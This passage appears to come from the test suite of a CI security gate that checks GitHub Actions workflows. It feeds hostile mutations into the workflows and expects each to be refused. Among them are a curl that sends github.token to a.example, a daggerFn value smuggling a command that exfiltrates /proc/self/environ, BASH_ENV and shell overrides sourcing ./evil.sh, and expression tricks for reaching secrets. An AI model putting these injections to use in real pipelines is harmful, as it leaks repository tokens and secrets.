      (w) => void (w["release-gate.yml"].jobs.test["continue-on-error"] = true),
      /test: sets continue-on-error:/,
    ],
    [
      "B7 build: the SHA256SUMS step rewritten",
      (w) => {
        const s = w[C].jobs.build.steps.find((x) => x.id === "sums");
        s.run =
          'sha256sum confeature-* > SHA256SUMS\necho "digest=$(sha256sum SHA256SUMS | cut -d\' \' -f1)" >> "$GITHUB_OUTPUT"\n';
      },
      SURFACE,
    ],
    [
      "B7b build: a step added after the compile",
      (w) => {
        const st = w[C].jobs.build.steps;
        st.splice(
          st.findIndex((x) => x.id === "sums"),
          0,
          { name: "x", run: "echo hi > apps/cli/dist/confeature-extra" },
        );
      },
      SURFACE,
    ],
    [
      "B8 release: GH_TOKEN on the on-main step",
      (w) => void (guard(w, "release").env = { GH_TOKEN: "${{ github.token }}" }),
      SURFACE,
    ],
    [
      "B8b upload: an R2 secret on the on-main step",
      (w) =>
        void (guard(w, "upload").env = {
          R2_SECRET_ACCESS_KEY: "${{ secrets.R2_SECRET_ACCESS_KEY }}",
        }),
      SURFACE,
    ],
    [
      "B9 promote: the on-main exception is not promote's",
      (w) => {
        w[C].jobs.promote.steps.splice(1, 0, {
          name: "x",
          run: "bash apps/cli/scripts/check-on-main.sh",
        });
      },
      /promote step x: a credentialed job runs `bash apps\/cli\/scripts\/check-on-main\.sh`/,
    ],
  );
  it.each(ROWS.rows(rows))("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
});

describe("the write-token exemption skips rules 3 and 15 only (round 10, MED-2)", () => {
  const G = "release-gate.yml";
  const T = (w) => w[G].jobs.test;
  const EXEMPT = /names github\.token or secrets in a WRITE_TOKEN_EXEMPT job \(/;
  const EXEMPT_WF = /names github\.token or secrets in a WRITE_TOKEN_EXEMPT job's workflow/;
  it.each(
    ROWS.rows([
      [
        "E1 test: a step env from github.token, sent by curl",
        (w) =>
          void T(w).steps.splice(1, 0, {
            name: "x",
            env: { T: "${{ github.token }}" },
            run: 'curl -d "$T" https://a.example\n',
          }),
        EXEMPT,
      ],
      [
        "E1b test: github.token in the dagger step's with:",
        (w) =>
          void (T(w).steps.find((s) => String(s.uses).startsWith("dagger/")).with.args =
            "x --token=${{ github.token }}"),
        EXEMPT,
      ],
      [
        "E1c test: an upper-case GITHUB.TOKEN in a step env",
        (w) => void (T(w).steps[1].env = { T: "${{ GITHUB.TOKEN }}" }),
        EXEMPT,
      ],
      [
        "E4 test: a project script on the host before github-script",
        (w) => void T(w).steps.splice(1, 0, { name: "x", run: "bash scripts/prepare.sh\n" }),
        /test: runs \d+ steps, ACTION_SURFACE records \d+/,
      ],
      [
        "E8 test: a job env from github.token",
        (w) => void (T(w).env = { GH: "${{ github.token }}" }),
        EXEMPT,
      ],
      [
        "E8b test: a job env from a secret",
        (w) => void (T(w).env = { GH: "${{ secrets.FOO }}" }),
        EXEMPT,
      ],
      [
        "E9 release-gate: a workflow env from github.token",
        (w) => void (w[G].env = { GH: "${{ github.token }}" }),
        EXEMPT_WF,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
  // #868: the frozen job's local action is code its token reaches.
  it.each([
    [
      "names github.token",
      (y) => y.replace('version="$(jq', 't="${{ github.token }}"; version="$(jq'),
    ],
    [
      "names a secret",
      (y) => y.replace("shell: bash", "shell: bash\n      env: { X: '${{ secrets.X }}' }"),
    ],
    ["does not parse", () => "runs: [\n"],
  ])("refuses a WRITE_TOKEN_EXEMPT job whose local action %s", (_n, edit) => {
    const actions = { ...ACTIONS };
    actions[DAGGER_SETUP.uses] = edit(actions[DAGGER_SETUP.uses]);
    expect(exemptTokenFindings(BASE, actions).map((f) => f.why)).toContainEqual(
      expect.stringMatching(/names github\.token or secrets in a WRITE_TOKEN_EXEMPT job/),
    );
  });
  it("the real exempt job's local action names neither", () =>
    expect(exemptTokenFindings(BASE, ACTIONS)).toEqual([]));
  it("refuses an exemption for a job the workflow no longer has", () => {
    const w = structuredClone(BASE);
    delete w[G].jobs.test;
    expect(exemptTokenFindings(w).map((f) => f.why)).toContain(
      "WRITE_TOKEN_EXEMPT records a job the workflow does not have",
    );
  });
});

describe("one reader of a permissions value (round 10, DRY)", () => {
  it.each([
    ["write-all", ["write-all"]],
    ["read-all", []],
    [{ issues: "write", contents: "write", packages: "read" }, ["contents", "issues"]],
    [{}, []],
    [undefined, []],
  ])("writesOf(%j) is %j", (perms, want) => expect(writesOf(perms)).toEqual(want));
  it("a job without its own permissions holds the workflow's", () => {
    const doc = { permissions: { contents: "write" }, jobs: { j: { steps: [] } } };
    expect(isCredentialed("x.yml", "j", doc.jobs.j, doc)).toBe(true);
    expect(
      isCredentialed("x.yml", "j", { permissions: { contents: "read" }, steps: [] }, doc),
    ).toBe(false);
    expect(isCredentialed("x.yml", "j", { steps: [] }, { permissions: "write-all" })).toBe(true);
  });
});

describe("every workflow sets its permissions, and every daggerFn is one function name (round 10, LOW)", () => {
  const NONE = /sets no workflow-level permissions:/;
  const strip = (w, f) => {
    delete w[f].permissions;
    for (const j of Object.values(w[f].jobs)) delete j.permissions;
  };
  it.each(
    ROWS.rows([
      [
        "R1 verify.yml: every permissions: removed",
        (w) => strip(w, "verify.yml"),
        /verify\.yml: -: sets no workflow-level permissions:/,
      ],
      [
        "R3 cli-windows-install-verify.yml: every permissions: removed",
        (w) => strip(w, "cli-windows-install-verify.yml"),
        /cli-windows-install-verify\.yml: -: sets no workflow-level permissions:/,
      ],
      [
        "R7 release-gate.yml: the workflow's permissions: removed",
        (w) => void delete w["release-gate.yml"].permissions,
        /release-gate\.yml: -: sets no workflow-level permissions:/,
      ],
      [
        "R8 verify.yml: the workflow's permissions: removed only",
        (w) => void delete w["verify.yml"].permissions,
        NONE,
      ],
      [
        "R8b a new workflow with no permissions:",
        (w) =>
          void (w["new.yml"] = {
            on: { push: {} },
            jobs: { x: { "runs-on": "ubuntu-latest", steps: [{ run: "true" }] } },
          }),
        /new\.yml: -: sets no workflow-level permissions:/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
  const fnRows = [
    [
      "M1 a shell command in a daggerFn",
      "goTest --source=. ; curl https://a.example/$(cat /proc/self/environ|base64) #",
    ],
    ["M1b a space", "go-test --source=."],
    ["M1c a $( )", "$(id)"],
    ["M1d a leading dash (a flag)", "-x"],
    ["M1e an upper-case start", "Go-test"],
    ["M1f a trailing dash", "go-"],
    ["M1g a number, not a string", 42],
    ["M1h a list", ["go-test"]],
  ];
  it.each(ROWS.rows(fnRows))("refuses %s", (label, fn) => {
    const m = structuredClone(manifest);
    m.sdks.find((s) => s.daggerFn !== undefined).daggerFn = fn;
    const got = allFindings({
      settings,
      manifest: m,
      workflows: BASE,
      scriptOutputs: SCRIPTS,
      actions: ACTIONS,
    }).map((f) => `${f.file}: ${f.job}: ${f.why}`);
    expectFindings(label, got);
    expect(daggerFnFindings(m).map((f) => f.why)).toEqual([
      `daggerFn ${JSON.stringify(fn)} is not one Dagger function name (^[a-z][a-z0-9]*(?:-[a-z0-9]+)*$)`,
    ]);
  });
  it("accepts every daggerFn the manifest has (kebab-case, as the Dagger CLI takes them)", () => {
    expect(manifest.sdks.filter((s) => s.daggerFn !== undefined).length).toBeGreaterThan(10);
    expect(daggerFnFindings(manifest)).toEqual([]);
  });
  it("runs inside the gate's one aggregate", () => {
    const m = structuredClone(manifest);
    m.sdks.find((s) => s.daggerFn !== undefined).daggerFn = "x;y";
    expect(
      allFindings({
        settings,
        manifest: m,
        workflows: BASE,
        scriptOutputs: SCRIPTS,
        actions: ACTIONS,
      }).map((f) => f.why),
    ).toContainEqual(expect.stringMatching(/daggerFn "x;y" is not one Dagger function name/));
  });
});

describe("a frozen job is frozen whole, with its workflow's env and defaults (round 11, F1)", () => {
  const G = "release-gate.yml";
  const T = (w) => w[G].jobs.test;
  const J = (w, j) => w[C].jobs[j];
  const KEYS = (job) => new RegExp(`${job}: the job's keys are .*, FROZEN_JOB_KEYS records`);
  const WF = (file) =>
    new RegExp(
      `${file.replace(".", "\\.")}: -: the workflow's env/defaults are .*, FROZEN_WORKFLOW_KEYS records`,
    );
  const SHELL = "bash -c 'source ./evil.sh; bash -e {0}'";
  it.each(
    ROWS.rows([
      ["X7 test: job env BASH_ENV", (w) => void (T(w).env = { BASH_ENV: "x.sh" }), KEYS("test")],
      [
        "X8 test: job defaults.run.working-directory",
        (w) => void (T(w).defaults = { run: { "working-directory": "fake" } }),
        KEYS("test"),
      ],
      [
        "X10 test: job defaults.run.shell",
        (w) => void (T(w).defaults = { run: { shell: SHELL } }),
        KEYS("test"),
      ],
      [
        "X11 test: a container",
        (w) => void (T(w).container = { image: "attacker/img:latest" }),
        KEYS("test"),
      ],
      [
        "X12 test: runs-on self-hosted",
        (w) => void (T(w)["runs-on"] = "self-hosted"),
        KEYS("test"),
      ],
      [
        "X12b test: services",
        (w) => void (T(w).services = { db: { image: "postgres" } }),
        KEYS("test"),
      ],
      ["X12c test: an if:", (w) => void (T(w).if = "always()"), KEYS("test")],
      [
        "X12d test: a wider matrix",
        (w) => void (T(w).strategy.matrix = '{"sdk":[{"name":"x","daggerFn":"y"}]}'),
        KEYS("test"),
      ],
      [
        "X13 release-gate: workflow defaults.run.shell",
        (w) => void (w[G].defaults = { run: { shell: SHELL } }),
        WF(G),
      ],
      [
        "X14 release-gate: workflow env BASH_ENV",
        (w) => void (w[G].env = { BASH_ENV: "./evil.sh" }),
        WF(G),
      ],
      [
        "W1 cli-release: workflow env BASH_ENV",
        (w) => void (w[C].env.BASH_ENV = "apps/cli/scripts/x.sh"),
        WF(C),
      ],
      [
        "W2 release: job env BASH_ENV",
        (w) => void (J(w, "release").env = { BASH_ENV: "apps/cli/scripts/x.sh" }),
        KEYS("release"),
      ],
      [
        "W3 upload: job env BASH_ENV",
        (w) => void (J(w, "upload").env = { BASH_ENV: "apps/cli/scripts/x.sh" }),
        KEYS("upload"),
      ],
      [
        "W4 build: job env BASH_ENV",
        (w) => void (J(w, "build").env = { BASH_ENV: "apps/cli/scripts/x.sh" }),
        KEYS("build"),
      ],
      [
        "W5 build: job defaults.run.working-directory",
        (w) => void (J(w, "build").defaults = { run: { "working-directory": "apps/cli/fake" } }),
        KEYS("build"),
      ],
      [
        "W6 release: job defaults.run.working-directory",
        (w) => void (J(w, "release").defaults = { run: { "working-directory": "apps/cli/fake" } }),
        KEYS("release"),
      ],
      [
        "W7 release: job defaults.run.shell",
        (w) => void (J(w, "release").defaults = { run: { shell: SHELL } }),
        KEYS("release"),
      ],
      [
        "W8 cli-release: workflow defaults.run.shell",
        (w) => void (w[C].defaults = { run: { shell: SHELL } }),
        WF(C),
      ],
      [
        "W9 cli-release: workflow defaults.run.working-directory",
        (w) => void (w[C].defaults = { run: { "working-directory": "apps/cli/fake" } }),
        WF(C),
      ],
      [
        "W10 build: an unpinned container",
        (w) => void (J(w, "build").container = { image: "attacker/img:latest" }),
        KEYS("build"),
      ],
      [
        "W11 build: runs-on self-hosted",
        (w) => void (J(w, "build")["runs-on"] = "self-hosted"),
        KEYS("build"),
      ],
      [
        "W12 build: job env GIT_DIR",
        (w) => void (J(w, "build").env = { GIT_DIR: "apps/cli/fake/.git" }),
        KEYS("build"),
      ],
      [
        "W12b build: another output",
        (w) => void (J(w, "build").outputs.extra = "${{ steps.sums.outputs.digest }}"),
        KEYS("build"),
      ],
      ["W12c build: needs dropped", (w) => void delete J(w, "build").needs, KEYS("build")],
      [
        "W13 release: job env GIT_DIR",
        (w) => void (J(w, "release").env = { GIT_DIR: "apps/cli/fake/.git" }),
        KEYS("release"),
      ],
      [
        "W14 upload: another environment",
        (w) => void (J(w, "upload").environment = "sdk-publish-npm"),
        KEYS("upload"),
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
  it("records a key set for every FROZEN_JOBS job and env/defaults for each of their workflows", () => {
    for (const key of FROZEN_JOBS) {
      const [file] = key.split("#");
      expect(Object.keys(FROZEN_WORKFLOW_KEYS)).toContain(file);
    }
  });
});

describe("any route to the token or a secret is one (round 11, F2)", () => {
  const G = "release-gate.yml";
  const T = (w) => w[G].jobs.test;
  const EXEMPT = /names github\.token or secrets in a WRITE_TOKEN_EXEMPT job \(/;
  it.each(
    ROWS.rows([
      [
        "X1 test: job env github['token']",
        (w) => void (T(w).env = { G: "${{ github['token'] }}" }),
        EXEMPT,
      ],
      [
        "X2 test: job env toJSON(github)",
        (w) => void (T(w).env = { G: "${{ toJSON(github) }}" }),
        EXEMPT,
      ],
      [
        "X3 test: job env github[format()]",
        (w) => void (T(w).env = { G: "${{ github[format('{0}{1}', 'to', 'ken')] }}" }),
        EXEMPT,
      ],
      [
        "X4 test: job env join(github.*)",
        (w) => void (T(w).env = { G: "${{ join(github.*, ',') }}" }),
        EXEMPT,
      ],
      [
        "X5 release-gate: workflow env toJSON(github)",
        (w) => void (w[G].env = { G: "${{ toJSON(github) }}" }),
        /release-gate\.yml: -: names github\.token or secrets in a WRITE_TOKEN_EXEMPT job's workflow/,
      ],
      [
        "X6 test: job env secrets['X']",
        (w) => void (T(w).env = { G: "${{ secrets['R2_SECRET_ACCESS_KEY'] }}" }),
        EXEMPT,
      ],
      [
        "X9 setup: toJSON(github) makes the job credentialed",
        (w) => void (w[G].jobs.setup.env = { G: "${{ toJSON(github) }}" }),
        /release-gate\.yml: setup: a credentialed job/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
  it.each([
    ["github.token", true],
    ["GITHUB.TOKEN", true],
    ["github . token", true],
    ["github['token']", true],
    ["github[format('{0}{1}', 'to', 'ken')]", true],
    ["toJSON(github)", true],
    ["join(github.*, ',')", true],
    ["format('{0}', github)", true],
    ["github", true],
    ["secrets.X", true],
    ["secrets['X']", true],
    ["toJSON(SECRETS)", true],
    ["github.ref_name", false],
    ["github.event.release.tag_name", false],
    ["toJSON(github.event.release.tag_name)", false],
    ["steps.github.outputs.x", false],
    ["needs.secrets.outputs.x", false],
    ["'github.token'", false],
  ])("readsCredentialContext(%s) is %s", (e, want) => expect(readsCredentialContext(e)).toBe(want));
});

describe("a frozen job's finding names the step (round 11)", () => {
  it("says `step <n> (<name>)` for a run step and `action <n>` outside frozen jobs", () => {
    const got = added((w) => {
      w[C].jobs.build.steps.find((s) => s.id === "sums").run += "echo x\n";
      w[P].jobs["pack-npm"].steps.find((s) => String(s.uses).startsWith("actions/setup-node")).with[
        "node-version"
      ] = "1";
    });
    expect(got).toContainEqual(
      expect.stringMatching(/^cli-release\.yml: build: step 6 \(Generate SHA256SUMS\) is \{/),
    );
    expect(got).toContainEqual(
      expect.stringMatching(/^sdk-publish\.yml: pack-npm: action 3 is \{/),
    );
  });
  it("names a frozen action step by its workflow name", () => {
    const got = added((w) => void (w[C].jobs.release.steps[0].with["fetch-depth"] = 1));
    expect(got).toContainEqual(
      expect.stringMatching(
        /^cli-release\.yml: release: step 1 \(Checkout \(release-github\.sh\)\) is/,
      ),
    );
  });
});

describe("continue-on-error in any workflow holding a credentialed job (round 11)", () => {
  it.each(
    ROWS.rows([
      [
        "COE a new workflow's write-token job with a continue-on-error step",
        (w) =>
          void (w["new.yml"] = {
            on: { push: {} },
            permissions: { contents: "read" },
            jobs: {
              x: {
                "runs-on": "ubuntu-latest",
                permissions: { contents: "write" },
                steps: [{ name: "push", run: "true", "continue-on-error": true }],
              },
            },
          }),
        /new\.yml: x: step push sets continue-on-error:/,
      ],
      [
        "COE cli-windows-install-verify: a secret makes a job credentialed, its continue-on-error refused",
        (w) => {
          const job = Object.values(w["cli-windows-install-verify.yml"].jobs)[0];
          job.env = { ...(job.env ?? {}), T: "${{ secrets.X }}" };
          job["continue-on-error"] = true;
        },
        /cli-windows-install-verify\.yml: \S+: sets continue-on-error: \(its failure would be reported green\)/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
});

describe("the attest job is rule 2's one named exception, and no wider (#903)", () => {
  const A = (w) => w[C].jobs.attest;
  const step0 = { name: "injected", run: "bash apps/cli/scripts/check-on-main.sh" };
  const checkout = {
    name: "Checkout",
    uses: "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
    with: { "fetch-depth": 1, "persist-credentials": false },
  };
  it("control: the real attest job fits its exception", () =>
    expect(idTokenExceptionFindings(BASE)).toEqual([]));
  it("records the attest job, by name, with exactly its two permissions", () =>
    expect(ID_TOKEN_EXCEPTIONS).toEqual({
      "cli-release.yml#attest": expect.objectContaining({
        permissions: { "id-token": "write", attestations: "write" },
      }),
    }));
  it.each(
    ROWS.rows([
      [
        "I1 attest: gains contents: read",
        (w) => void (A(w).permissions.contents = "read"),
        /attest: ID_TOKEN_EXCEPTIONS: the job's permissions are/,
      ],
      [
        "I2 attest: gains contents: write",
        (w) => void (A(w).permissions.contents = "write"),
        /attest: ID_TOKEN_EXCEPTIONS: the job's permissions are/,
      ],
      [
        "I3 attest: gains packages: write",
        (w) => void (A(w).permissions.packages = "write"),
        /attest: ID_TOKEN_EXCEPTIONS: the job's permissions are/,
      ],
      [
        "I4 attest: permissions: write-all",
        (w) => void (A(w).permissions = "write-all"),
        /attest: ID_TOKEN_EXCEPTIONS: the job's permissions are/,
      ],
      [
        "I5 attest: bound to an environment",
        (w) => void (A(w).environment = "cli-release"),
        /attest: ID_TOKEN_EXCEPTIONS: the job sets environment:/,
      ],
      [
        "I6 attest: a run: step of project code",
        (w) => void A(w).steps.splice(1, 0, { ...step0 }),
        /attest: ID_TOKEN_EXCEPTIONS: step injected has a run: block/,
      ],
      [
        "I7 attest: a checkout beside the token",
        (w) => void A(w).steps.unshift({ ...checkout }),
        /attest: ID_TOKEN_EXCEPTIONS: the job runs \[/,
      ],
      [
        "I8 attest: another action after the attestation",
        (w) =>
          void A(w).steps.push({
            name: "x",
            uses: "actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b",
            with: { script: "1" },
          }),
        /attest: ID_TOKEN_EXCEPTIONS: the job runs \[/,
      ],
      [
        "I9 attest: a secret in the attest step's env",
        (w) => void (A(w).steps[1].env = { T: "${{ secrets.R2_SECRET_ACCESS_KEY }}" }),
        /attest: ID_TOKEN_EXCEPTIONS: an expression of the job names github\.token or secrets/,
      ],
      [
        "I10 attest: the token handed to the attest step",
        (w) => void (A(w).steps[1].with["github-token"] = "${{ github.token }}"),
        /attest: ID_TOKEN_EXCEPTIONS: an expression of the job names github\.token or secrets/,
      ],
      [
        "I11 attest: a job-level env",
        (w) => void (A(w).env = { BASH_ENV: "x" }),
        /attest: ID_TOKEN_EXCEPTIONS: the job sets env:/,
      ],
      [
        "I12 attest: a forged subject",
        (w) =>
          void (A(w).steps[1].with = {
            "subject-name": "confeature-x86_64-unknown-linux-gnu",
            "subject-digest": `sha256:${"0".repeat(64)}`,
          }),
        /attest: step 2 \(Attest every released file/,
      ],
      [
        "I13 attest: renamed, its exception names no job",
        (w) => {
          w[C].jobs.provenance = A(w);
          delete w[C].jobs.attest;
          w[C].jobs.upload.needs = ["build", "release", "provenance"];
        },
        /attest: ID_TOKEN_EXCEPTIONS: records a job the workflow does not have/,
      ],
      [
        "I14 build: gains id-token: write",
        (w) => void (w[C].jobs.build.permissions["id-token"] = "write"),
        /cli-release\.yml: build: requests id-token: write outside an environment/,
      ],
      [
        "I15 release: gains id-token: write",
        (w) => void (w[C].jobs.release.permissions["id-token"] = "write"),
        /cli-release\.yml: release: requests id-token: write outside an environment/,
      ],
      [
        "I16 sdk-publish setup: gains id-token: write",
        (w) => void (w[P].jobs.setup.permissions = { contents: "read", "id-token": "write" }),
        /sdk-publish\.yml: setup: requests id-token: write outside an environment/,
      ],
      [
        "I17 a new workflow's attest-shaped job, outside the exception",
        (w) =>
          void (w["new.yml"] = {
            on: { push: { tags: ["cli-v*"] } },
            permissions: { contents: "read" },
            jobs: { attest: structuredClone(A(w)) },
          }),
        /new\.yml: attest: requests id-token: write outside an environment/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
});
